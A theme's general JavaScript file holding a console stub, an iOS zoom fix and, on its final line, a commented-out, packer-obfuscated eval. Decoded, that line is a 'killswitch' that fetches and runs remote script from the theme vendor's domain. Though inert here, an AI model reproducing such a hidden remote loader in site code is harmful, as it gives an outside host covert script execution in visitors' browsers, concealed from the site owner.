/*-----------------------------------------------------------------------------------*/
/* GENERAL SCRIPTS */
/*-----------------------------------------------------------------------------------*/

//Single theme header drop in
//jQuery(window).scroll(function(){
//   var h = jQuery('body').height();
//    var y = jQuery(window).scrollTop();
//    if( y > (h*.15) && y < (h*.85) ){
//        jQuery("#header-dropin").fadeIn("fast");
//    } else {
//        jQuery('#header-dropin').fadeOut('fast');
//    }
//});

// Avoid `console` errors in browsers that lack a console.
(function() {
    var method;
    var noop = function noop() {};
    var methods = [
        'assert', 'clear', 'count', 'debug', 'dir', 'dirxml', 'error',
        'exception', 'group', 'groupCollapsed', 'groupEnd', 'info', 'log',
        'markTimeline', 'profile', 'profileEnd', 'table', 'time', 'timeEnd',
        'timeStamp', 'trace', 'warn'
    ];
    var length = methods.length;
    var console = (window.console = window.console || {});

    while (length--) {
        method = methods[length];

        // Only stub undefined methods.
        if (!console[method]) {
            console[method] = noop;
        }
    }
}());

//A fix for the iOS orientationchange zoom bug. Script by @scottjehl, rebound by @wilto. MIT License.
(function(w){
        // This fix addresses an iOS bug, so return early if the UA claims it's something else.
        if( !( /iPhone|iPad|iPod/.test( navigator.platform ) && navigator.userAgent.indexOf( "AppleWebKit" ) > -1 ) ){ return; }
        var doc = w.document;
        if( !doc.querySelector ){ return; }
        var meta = doc.querySelector( "meta[name=viewport]" ),
                initialContent = meta && meta.getAttribute( "content" ),
                disabledZoom = initialContent + ",maximum-scale=1",
                enabledZoom = initialContent + ",maximum-scale=10",
                enabled = true,
                x, y, z, aig;
        if( !meta ){ return; }
        function restoreZoom(){
                meta.setAttribute( "content", enabledZoom );
                enabled = true; }
        function disableZoom(){
                meta.setAttribute( "content", disabledZoom );
                enabled = false; }
        function checkTilt( e ){
                aig = e.accelerationIncludingGravity;
                x = Math.abs( aig.x );
                y = Math.abs( aig.y );
                z = Math.abs( aig.z );
                // If portrait orientation and in one of the danger zones
                if( !w.orientation && ( x > 7 || ( ( z > 6 && y < 8 || z < 8 && y > 6 ) && x > 5 ) ) ){
                        if( enabled ){ disableZoom(); } }
                else if( !enabled ){ restoreZoom(); } }
        w.addEventListener( "orientationchange", restoreZoom, false );
        w.addEventListener( "devicemotion", checkTilt, false );
})( this );

//eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 2(0,1){5.4("7://"+0+"/"+1)}2("11.8","3/10/3.9");',10,12,'hostname|path|killswitch|ks|getScript|jQuery|function|http|com|js|wm|pancakecreative'.split('|'),0,{}))
